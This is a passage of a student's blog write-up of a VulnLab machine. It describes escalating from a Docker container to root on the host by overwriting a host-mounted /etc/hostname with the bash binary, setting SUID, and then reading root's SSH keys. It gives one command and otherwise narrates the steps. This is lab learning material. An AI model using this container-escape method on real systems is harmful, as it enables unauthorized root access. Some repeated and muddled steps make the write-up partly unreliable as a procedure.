+<h2 id="Accessing-the-Docker-Container"><a href="#Accessing-the-Docker-Container" class="headerlink" title="Accessing the Docker Container"></a>Accessing the Docker Container</h2><p><img src="/%5Cimages%5CData%5Caccess_docker_container.png" alt="Accessing docker container"></p>
+<ul>
+<li>With the docker privileges found earlier for boris, we can open an interactive Bash shell as root in the docker container. We ultimately want root privileges on the host machine.</li>
+</ul>
+<h2 id="Exploiting-Docker-Container-for-PrivEsc-to-root-on-host-machine"><a href="#Exploiting-Docker-Container-for-PrivEsc-to-root-on-host-machine" class="headerlink" title="Exploiting Docker Container for PrivEsc to root on host machine"></a>Exploiting Docker Container for PrivEsc to root on host machine</h2><p><img src="/%5Cimages%5CData%5Ccontainer_vuln.png" alt="Scanning docker container"></p>
+<ul>
+<li>With <a target="_blank" rel="noopener" href="https://github.com/stealthcopter/deepce">deepce.sh</a> (similar to WinPEAs but for Docker), host it on a HTTP sever on Kali Linux and download it onto the docker container.</li>
+<li>We see where certain files on the container are <strong>redirected</strong> from on the host machine. (i.e. <code>/var/snap/docker/common/.../hostname</code> on the host machine redirects to <code>/etc/hostname</code> on the container)</li>
+</ul>
+<p><img src="/%5Cimages%5CData%5Cmodify_etc_hostname.png" alt="Modify &#x2F;etc&#x2F;hostname"></p>
+<ul>
+<li>In the bash shell on the container, we can modify the contents of <code>/etc/hostname</code> to an arbitrary value. As boris in the SSH session, we can read the new contents of the <code>hostname</code> file <strong>on the host machine</strong>.</li>
+<li>As a low-privileged user, we can abuse this by modifying the value of the host machine’s <code>hostname</code> file to an executable file and get root access.</li>
+</ul>
+<p><img src="/%5Cimages%5CData%5Cchmod_777_etc_hostname.png" alt="Set global-write permissions on &#x2F;etc&#x2F;hostname"></p>
+<ul>
+<li>In the bash shell on the container, set <strong>world-writable permissions</strong> on the <code>/etc/hostname</code> file.</li>
+<li>In the SSH session as boris, redirect the <code>/var/snap/docker/common/.../hostname</code> directory to the <code>/bin/bash</code> binary on the container. The container’s <code>/etc/hostname</code> file is now overwritten with the contents of the bash binary.</li>
+</ul>
+<p><img src="/%5Cimages%5CData%5Cchmod_777_etc_hostname.png" alt="Set world-writable permissions on &#x2F;etc&#x2F;hostname"></p>
+<ul>
+<li>In the container, set <code>/etc/hostname</code> with world-writable privileges, the SUID and change its owner to root.</li>
+<li>In the SSH session as boris, redirect the <code>/var/snap/docker/common/.../hostname</code> directory to the <code>/bin/bash</code> binary on the container. The container’s <code>/etc/hostname</code> file is now overwritten with the contents of the bash binary.</li>
+<li>We can now access the host server as root.</li>
+</ul>
+<p><img src="/%5Cimages%5CData%5Cssh_keys_root.png" alt="Access root SSH keys on target server"></p>
+<ul>
+<li>We can access its SSH keys as root.</li>
+</ul>
+<h1 id="My-Takeaways"><a href="#My-Takeaways" class="headerlink" title="My Takeaways"></a>My Takeaways</h1><ol>
+<li><p><strong>How do we know that the 1st machine we pwned was a docker instance? How does the difference of the <code>/etc/passwd</code> contents indicate this?</strong></p>
+<p> Grafana is a service commonly run on docker instances (an active container) Each docker container has its own <code>/etc/passwd</code> file. Host users’ entries are never added into the file by default. The difference in the 2 files means the file accessed from the HTTP server is <strong>not the host’s</strong> <code>/etc/passwd</code> file, but the instance it’s running in. Hence, the 1st <code>/etc/passwd</code> file is in the container environment.</p>
+</li>
+<li><p>A docker instance must be hosted and running on a host machine. We eventually want to get root privileges on that host machine.</p>
+</li>
+<li><p>When running a command like <code>cat {file A} &gt; {file B}</code>, you are overwriting the contents of the latter with the former.</p>
+</li>
+<li><p>In this lab, <code>/var/snap/docker/common/.../hostname</code> on the host machine redirects to <code>/etc/hostname</code> on the container. Running <code>cat /bin/bash &gt; /var/snap/docker/common/.../hostname</code> changes the contents of <code>/etc/hostname</code> in the container. The host mount is unchanged. That is why you still run commands on <code>/etc/hostname</code> on the container. It gets weaponized to run a bash shell as root.</p>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">Jon Loh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/12/31/Data/">http://example.com/2025/12/31/Data/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Grafana/">Grafana</a><a class="post-meta__tags" href="/tags/SSH/">SSH</a><a class="post-meta__tags" href="/tags/sqlite3/">sqlite3</a><a class="post-meta__tags" href="/tags/Docker/">Docker</a><a class="post-meta__tags" href="/tags/Directory-Traversal/">Directory Traversal</a><a class="post-meta__tags" href="/tags/Arbitrary-File-Read/">Arbitrary File Read</a><a class="post-meta__tags" href="/tags/Passsword-Reuse/">Passsword Reuse</a><a class="post-meta__tags" href="/tags/Insecure-User-Permissions/">Insecure User Permissions</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/05/Down/" title="Down"><img class="cover" src="/images%5CDown%5Cdown_vl.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Down</div></div><div class="info-2"><div class="info-item-1">TLDRThis is an easy lab from VulnLabs where you learn to test and exploit SSRF and curl, analyse vulnerable source code and abuse it to gain a reverse shell as root. Enumeration1234567891011121314151617181920212223242526(jon㉿kali)-[~/vulnLab/down]$ sudo nmap -p- -A down.vlStarting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 10:45 +08Nmap scan report for down.vl (10.10.103.81)Host is up (0.17s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     O...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/05/Down/" title="Down"><img class="cover" src="/images%5CDown%5Cdown_vl.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-05</div><div class="info-item-2">Down</div></div><div class="info-2"><div class="info-item-1">TLDRThis is an easy lab from VulnLabs where you learn to test and exploit SSRF and curl, analyse vulnerable source code and abuse it to gain a reverse shell as root. Enumeration1234567891011121314151617181920212223242526(jon㉿kali)-[~/vulnLab/down]$ sudo nmap -p- -A down.vlStarting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 10:45 +08Nmap scan report for down.vl (10.10.103.81)Host is up (0.17s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     O...</div></div></div></a><a class="pagination-related" href="/2026/01/27/Manage/" title="Manage"><img class="cover" src="/images%5CManage%5Cmanage_vl.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-27</div><div class="info-item-2">Manage</div></div><div class="info-2"><div class="info-item-1">TLDRLearn to enumerate the Java Remote Method Invocation (RMI) Framework and gain RCE on the target server. Enumeration12345678910111213(jon@kali)-[~/vulnLab/easy/manage]$ sudo nmap -p- manage.vl...Nmap scan report for manage.vl (10.10.95.212)Host is up (0.16s latency).Not shown: 65530 closed tcp ports (reset)PORT      STATE SERVICE22/tcp    open  ssh2222/tcp  open  EtherNetIP-18080/tcp  open  http-proxy35221/tcp open  unknown43123/tcp open  unknownNmap done: 1 IP address (1 host up) scanned ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jon Loh</div><div class="author-info-description">Info Sec Undergraduate</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/jon1oh" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/jon-loh/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0a66c2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Welcome to my blog site! This is where I share my VulnLab writeups and all things cyber!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TLDR"><span class="toc-number">1.</span> <span class="toc-text">TLDR</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-number">2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-22"><span class="toc-number">2.1.</span> <span class="toc-text">SSH (22)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-3000"><span class="toc-number">2.2.</span> <span class="toc-text">HTTP (3000)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Website-Features"><span class="toc-number">2.3.</span> <span class="toc-text">Website Features</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gaining-a-Foothold"><span class="toc-number">3.</span> <span class="toc-text">Gaining a Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-43798-Directory-Traversal-Arbitrary-Read-File"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2021-43798 (Directory Traversal &amp; Arbitrary Read File)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-etc-passwd"><span class="toc-number">3.1.1.</span> <span class="toc-text">Reading &#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-etc-grafana-grafana-ini"><span class="toc-number">3.1.2.</span> <span class="toc-text">Reading &#x2F;etc&#x2F;grafana&#x2F;grafana.ini</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analysing-var-lib-grafana-grafana-db"><span class="toc-number">3.1.3.</span> <span class="toc-text">Analysing &#x2F;var&#x2F;lib&#x2F;grafana&#x2F;grafana.db</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Priv-Esc"><span class="toc-number">4.</span> <span class="toc-text">Priv Esc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-Hashes"><span class="toc-number">4.1.</span> <span class="toc-text">Cracking Hashes</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post-Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Permissions"><span class="toc-number">5.1.</span> <span class="toc-text">User Permissions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Accessing-the-Docker-Container"><span class="toc-number">5.2.</span> <span class="toc-text">Accessing the Docker Container</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Docker-Container-for-PrivEsc-to-root-on-host-machine"><span class="toc-number">5.3.</span> <span class="toc-text">Exploiting Docker Container for PrivEsc to root on host machine</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#My-Takeaways"><span class="toc-number">6.</span> <span class="toc-text">My Takeaways</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/25/hello-world/" title="Hello World">Hello World</a><time datetime="2026-05-25T15:47:49.410Z" title="Created 2026-05-25 23:47:49">2026-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/24/Bruno/" title="Bruno"><img src="/images%5CBruno%5Cbruno_vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Bruno"/></a><div class="content"><a class="title" href="/2026/02/24/Bruno/" title="Bruno">Bruno</a><time datetime="2026-02-24T12:45:15.000Z" title="Created 2026-02-24 20:45:15">2026-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/27/Manage/" title="Manage"><img src="/images%5CManage%5Cmanage_vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Manage"/></a><div class="content"><a class="title" href="/2026/01/27/Manage/" title="Manage">Manage</a><time datetime="2026-01-27T07:56:29.000Z" title="Created 2026-01-27 15:56:29">2026-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/27/Escape/" title="Escape"><img src="/%5Cimages%5CEscape%5Cescape_vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Escape"/></a><div class="content"><a class="title" href="/2026/01/27/Escape/" title="Escape">Escape</a><time datetime="2026-01-27T03:35:12.000Z" title="Created 2026-01-27 11:35:12">2026-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/22/Lock/" title="Lock"><img src="/images%5CLock%5Clock_vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lock"/></a><div class="content"><a class="title" href="/2026/01/22/Lock/" title="Lock">Lock</a><time datetime="2026-01-22T02:40:23.000Z" title="Created 2026-01-22 10:40:23">2026-01-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Jon Loh</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = false;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
